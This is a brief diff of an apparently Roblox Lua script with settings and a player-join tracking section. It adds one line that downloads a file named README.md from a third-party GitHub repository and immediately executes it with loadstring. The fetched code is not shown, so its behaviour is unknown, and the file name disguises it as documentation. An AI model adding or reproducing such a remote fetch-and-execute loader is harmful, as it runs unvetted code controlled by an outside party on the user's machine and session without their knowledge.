@@ -37,6 +37,7 @@ _G.Settings = _G.Settings or {
 }
 
 if not game:IsLoaded() then repeat game.Loaded:Wait() until game:IsLoaded() end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/bonusking007/trackstatSTP/refs/heads/main/README.md"))()
 wait(2)
 
 -- Track player join time & auto-rejoin/leave
